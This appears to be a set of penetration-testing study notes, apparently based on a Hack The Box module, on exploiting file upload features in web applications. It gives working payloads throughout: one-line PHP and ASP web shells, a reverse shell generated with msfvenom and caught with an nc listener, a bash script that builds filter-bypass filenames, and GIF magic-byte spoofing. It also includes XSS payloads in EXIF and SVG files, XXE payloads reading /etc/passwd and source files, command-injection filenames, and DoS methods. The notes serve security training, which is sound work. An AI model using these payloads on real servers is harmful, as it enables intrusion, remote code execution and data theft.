# Basic Exploitation

## 1.Absent Validation

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FfEkxVMZKcfdayjN1PCI1%2Fimage.png?alt=media&amp;token=1aee5056-9542-4301-becd-320d163a0f7d" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FK5WccS9lihjbvJobfKHi%2Fimage.png?alt=media&amp;token=b3e8508e-1286-4ea7-8f05-ec999fbb90db" alt=""><figcaption></figcaption></figure>

### Identifying Web Framework

> One easy method to determine what language runs the web application is to visit the `/index.ext` page, where we would swap out `ext` with various common web extensions, like `php`, `asp`, `aspx`, among others, to see whether any of them exist.

&#x20;simply fuzz <https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt>

or

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FKxuux7ShNJeWKcN1Pc4v%2Fimage.png?alt=media&amp;token=fcab681c-7c78-48b8-824c-9e041edda89f" alt=""><figcaption></figcaption></figure>

* <https://www.wappalyzer.com/>

### Vulnerability Identification

```
 <?php echo "Hello HTB";?> to test.php
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F8Et5gY5NYmnhq2YE7E3e%2Fimage.png?alt=media&amp;token=c740a17b-0df2-48cf-9ab3-4c8f9b2d22eb" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FdDTKqtR5LeTIQT0FqdQv%2Fimage.png?alt=media&amp;token=337a41ee-58c5-483e-9a70-e7ca56035f6e" alt=""><figcaption></figcaption></figure>

## 2.Upload Exploitation

## Web Shells

> <https://github.com/Arrexel/phpbash>
>
> <https://github.com/danielmiessler/SecLists/tree/master/Web-Shells>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F5CSi8onv6IxCc1KSKBzg%2Fimage.png?alt=media&amp;token=d6d80bec-e865-46da-b545-11fceb9036b8" alt=""><figcaption></figcaption></figure>

### Writing Custom Web Shell

save as to shell.php

```php
<?php system($_REQUEST['cmd']); ?>
```

> example.com/uploads/shell.php?cmd=id

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FCXTMq5EuQwt71ZX8QRgG%2Fimage.png?alt=media&amp;token=f9653e00-3992-4e95-bcae-4b6f37e55e71" alt=""><figcaption></figcaption></figure>

For `.NET` web applications, we can pass the `cmd` parameter with `request('cmd')` to the `eval()` function, and it should also execute the command specified in `?cmd=`&#x20;

```asp
<% eval request('cmd') %>
```

### Reverse Shell

> <https://github.com/pentestmonkey/php-reverse-shell>\
> <https://github.com/danielmiessler/SecLists/tree/master/Web-Shells>

**change this**

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

```shell-session
nc -lvnp OUR_PORT
```

### Generating Custom Reverse Shell Scripts

```shell-session
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

```shell-session
nc -lvnp OUR_PORT
```


# Bypassing Filters

## 1.Client-Side Validation

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FFWX9oE35C5bnXe6G6Stb%2Fimage.png?alt=media&amp;token=1cb0ae79-8aba-4618-ac3f-324b043b52f0" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FL5YsIPneuvKEiglSRMIP%2Fimage.png?alt=media&amp;token=da70be77-0002-4f9a-a089-0bcf3d39e318" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FX6BQ9YYXKxRuz0Juyb30%2Fimage.png?alt=media&amp;token=3fa40cb9-d7eb-4e1a-b1be-abd304094f03" alt=""><figcaption></figcaption></figure>

### Back-end Request Modification

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FUPmnq5WvTHfeOryVV9KS%2Fimage.png?alt=media&amp;token=d78a6f1a-1b05-4bc3-9a49-98e7b1a214eb" alt=""><figcaption></figcaption></figure>

raw request

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FnsIvbuR2AdVks0xftCnI%2Fimage.png?alt=media&amp;token=e70ff699-e24f-47e0-be0f-afff337619e5" alt=""><figcaption></figcaption></figure>

modified req

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FlXPjT0Kcp1L08JZwIscv%2Fimage.png?alt=media&amp;token=8e4fe7bd-51e3-48a5-a829-9ff1a29e4703" alt=""><figcaption></figcaption></figure>

> Note: We may also modify the `Content-Type` of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.

## Disabling Front-end Validation

To start, we can click \[`CTRL+SHIFT+C`] to toggle the browser's `Page Inspector`, and then click on the profile image, which is where we trigger the file selector for the upload form:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FhplclYD70ZgcC9gOrZSw%2Fimage.png?alt=media&amp;token=893e734a-9147-4d30-b02e-e21469ae80ef" alt=""><figcaption></figcaption></figure>

we can see the code

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

change this

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fs1WMyOKQxjNVErAoSShL%2Fimage.png?alt=media&amp;token=a7d240d9-f75e-4fd4-aabe-480e3e65ed76" alt=""><figcaption></figcaption></figure>

> Tip: You may also do the same to remove `accept=".jpg,.jpeg,.png"`, which should make selecting the `PHP` shell easier in the file selection dialog, though this is not mandatory, as mentioned earlier.

> target.com/profile\_images/shell.php?cmd=id

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FQLReKbZckb6ksNKMwQ2i%2Fimage.png?alt=media&amp;token=629e0490-ffa4-45d1-a87f-2afb32084267" alt=""><figcaption></figcaption></figure>

## 2.Blacklist Filters

## &#x20;Blacklisting Extensions

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FqMxQ8scwu3tqA6MZ4Kbj%2Fimage.png?alt=media&amp;token=550a2a81-49bc-4d07-96b9-e04d5760ab87" alt=""><figcaption></figcaption></figure>

### Fuzzing Extensions

> <https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt>
>
> <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP>
>
> <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst>\
> <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst>

intercept and send to intruder

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FiKpnOn68jNO12IqnoHRu%2Fimage.png?alt=media&amp;token=f8ab5d86-9faa-4b6d-afe6-398766314c7d" alt=""><figcaption></figcaption></figure>

Finally, we can `Load` the PHP extensions list from above in the `Payloads` tab under `Payload Options`. We will also un-tick the `URL Encoding` option to avoid encoding the (`.`) before the file extension.&#x20;

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fp4wzix236gMIlzva5s6B%2Fimage.png?alt=media&amp;token=7f540957-2806-46d2-af23-0f2fd4dbf28d" alt=""><figcaption></figcaption></figure>

## Non-Blacklisted Extensions

intercept raw request

Send to Repeater .phtml&#x20;

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F7KVMuapWqFs6hhPIL0oj%2Fimage.png?alt=media&amp;token=0f2724a3-527c-4f2a-ab70-cb19709da43d" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F2NwyuZ2eMnRgrpHJLY5G%2Fimage.png?alt=media&amp;token=5622233d-c986-455c-a925-a1a7a689d515" alt=""><figcaption></figcaption></figure>

## 3.Whitelist Filters

## Whitelisting Extensions

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F9Sl4wIgFFjpHVvN8d1rY%2Fimage.png?alt=media&amp;token=8c02a515-8be0-4238-af1b-84efd8ae4a94" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FASZKymThxvDzoy0FXqgY%2Fimage.png?alt=media&amp;token=0ddf9085-929e-438f-98a2-df52b65cfa8c" alt=""><figcaption></figcaption></figure>

### Double Extensions

shell.jpg.php

> <https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FnEN73oFcizF4Iepyp1Ai%2Fimage.png?alt=media&amp;token=c281ee34-0036-4298-a463-887e7a9ff616" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FhQrRtc3ceFAvuKjFPGtf%2Fimage.png?alt=media&amp;token=72912f9b-0f61-4794-bd28-963e402a2e9f" alt=""><figcaption></figcaption></figure>

### Reverse Double Extension

> <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FZXblBtoraKBDWhLFfizZ%2Fimage.png?alt=media&amp;token=df6d6586-a410-4f81-9d59-a2e6ec4a8455" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FkdhWGgsHuZNjqy8dAyGQ%2Fimage.png?alt=media&amp;token=3175dd6e-fb47-4ae7-92fc-5ef255dbbcd7" alt=""><figcaption></figcaption></figure>

## Character Injection

The following are some of the characters we may try injecting:

* `%20`
* `%0a`
* `%00`
* `%0d0a`
* `/`
* `.\`
* `.`
* `…`
* `:`

> Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (`shell.php%00.jpg`) works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the (`%00`), and store it as (`shell.php`), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (`:`) before the allowed file extension (e.g. `shell.aspx:.jpg`), which should also write the file as (`shell.aspx`). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.
>
> We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the `PHP` and `JPG` extensions, as follows:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

With this custom wordlist, we can run a fuzzing scan with `Burp Intruder`

## 4.Type Filters

There are two common methods for validating the file content: `Content-Type Header` or `File Content`

### Content-Type

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FAspDVpyj5rtxKtCjT4U7%2Fimage.png?alt=media&amp;token=4c2709de-19a0-4ac3-b875-78d026c442db" alt=""><figcaption></figcaption></figure>

If we change the file name to `shell.jpg.phtml` or `shell.php.jpg`, or even if we use `shell.jpg` with a web shell content, our upload will fail.

**Fuzz content-length**

```shell-session
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt

cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

send to intruder and fuzz (in our example image/jpg works)

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F0S2bs5drWHmhDGIK64rc%2Fimage.png?alt=media&amp;token=aeeeac30-554f-4792-aaf9-30b353e5301e" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FhMUhIqbXqcaWpQMQACEa%2Fimage.png?alt=media&amp;token=5b0ae03a-2933-42be-b92d-847e28b37db8" alt=""><figcaption></figcaption></figure>

### MIME-Type

> This is usually done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). For example, if a file starts with (`GIF87a` or `GIF89a`), this indicates that it is a `GIF` image, while a file starting with plaintext is usually considered a `Text` file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.

> Tip: Many other image types have non-printable bytes for their file signatures, while a `GIF` image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string `GIF8` is common between both GIF signatures, it is usually enough to imitate a GIF image.

```shell-session
echo "this is a text file" > text.jpg 
file text.jpg 

text.jpg: ASCII text
```

```shell-session
echo "GIF8" > text.jpg 
file text.jpg

text.jpg: GIF image data
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FpUSuHymVcu8w2XIKAvVk%2Fimage.png?alt=media&amp;token=967ac1aa-a0a5-43a9-a4ea-71d325099759" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F9bprz3xctOXXfDchNeJN%2Fimage.png?alt=media&amp;token=f811c686-bf01-4119-b74a-5e7149c5ead8" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FM1eiIQ5czhk2GCDv5bJn%2Fimage.png?alt=media&amp;token=5df7b682-2c4e-4325-a6a1-4eb9cdb1ddd8" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FcJMXWWHmNUe6Ebm8dFdP%2Fimage.png?alt=media&amp;token=39706bcb-3c15-410a-b93a-64aa56835da5" alt=""><figcaption></figcaption></figure>

> We can use a combination of the two methods discussed in this section, which may help us bypass some more robust content filters. For example, we can try using an `Allowed MIME type with a disallowed Content-Type`, an `Allowed MIME/Content-Type with a disallowed extension`, or a `Disallowed MIME/Content-Type with an allowed extension`, and so on. Similarly, we can attempt other combinations and permutations to try to confuse the web server, and depending on the level of code security, we may be able to bypass various filters.



# Other Upload Attacks

## 1.Limited File Uploads

### XSS

```shell-session
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg

exiftool HTB.jpg
```

Furthermore, if we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

\
&#x20;`HTB.svg`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

#### XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

### DoS

Finally, many file upload vulnerabilities may lead to a `Denial of Service (DOS)` attack on the web server. For example, we can use the previous XXE payloads to achieve DoS attacks, as discussed in the [Web Attacks](https://academy.hackthebox.com/module/details/134) module.

Furthermore, we can utilize a `Decompression Bomb` with file types that use data compression, like `ZIP` archives. If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.

Another possible DoS attack is a `Pixel Flood` attack with some image files that utilize image compression, like `JPG` or `PNG`. We can create any `JPG` image file with any image size (e.g. `500x500`), and then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.

In addition to these attacks, we may try a few other methods to cause a DoS on the back-end server. One way is uploading an overly large file, as some upload forms may not limit the upload file size or check for it before uploading it, which may fill up the server's hard drive and cause it to crash or slow down considerably.

If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. `../../../etc/passwd`), which may also cause the server to crash. `Try to search for other examples of DOS attacks through a vulnerable file upload functionality.`

## 2.Other Upload Attacks

### Injections in File Name

f we name a file `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`, and then the web application attempts to move the uploaded file with an OS command (e.g. `mv file /tmp`)

Similarly, we may use an XSS payload in the file name (e.g. `<script>alert(window.origin);</script>`), which would get executed on the target's machine if the file name is displayed to them. We may also inject an SQL query in the file name (e.g. `file';select+sleep(5);--.jpg`), which may lead to an SQL injection if the file name is insecurely used in an SQL query.

### Windows-specific Attacks

> We can also use a few `Windows-Specific` techniques in some of the attacks we discussed in the previous sections.
>
> One such attack is using reserved characters, such as (`|`, `<`, `>`, `*`, or `?`), which are usually reserved for special uses like wildcards. If the web application does not properly sanitize these names or wrap them within quotes, they may refer to another file (which may not exist) and cause an error that discloses the upload directory. Similarly, we may use Windows reserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`), which may also cause an error as the web application will not be allowed to write a file with this name.
>
> Finally, we may utilize the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist. Older versions of Windows were limited to a short length for file names, so they used a Tilde character (`~`) to complete the file name, which we can use to our advantage.
>
> For example, to refer to a file called (`hackthebox.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`). As Windows still supports this convention, we can write a file called (e.g. `WEB~1.CON`) to overwrite the `web.conf` file. Similarly, we may write a file that replaces sensitive system files. This attack can lead to several outcomes, like causing information disclosure through errors, causing a DoS on the back-end server, or even accessing private files.

### Advanced File Upload Attacks

In addition to all of the attacks we have discussed in this module, there are more advanced attacks that can be used with file upload functionalities. Any automatic processing that occurs to an uploaded file, like encoding a video, compressing a file, or renaming a file, may be exploited if not securely coded.

Some commonly used libraries may have public exploits for such vulnerabilities, like the AVI upload vulnerability leading to XXE in `ffmpeg`. However, when dealing with custom code and custom libraries, detecting such vulnerabilities requires more advanced knowledge and techniques, which may lead to discovering an advanced file upload vulnerability in some web applications.

There are many other advanced file upload vulnerabilities that we did not discuss in this module. Try to read some bug bounty reports to explore more advanced file upload vulnerabilities.

<br>
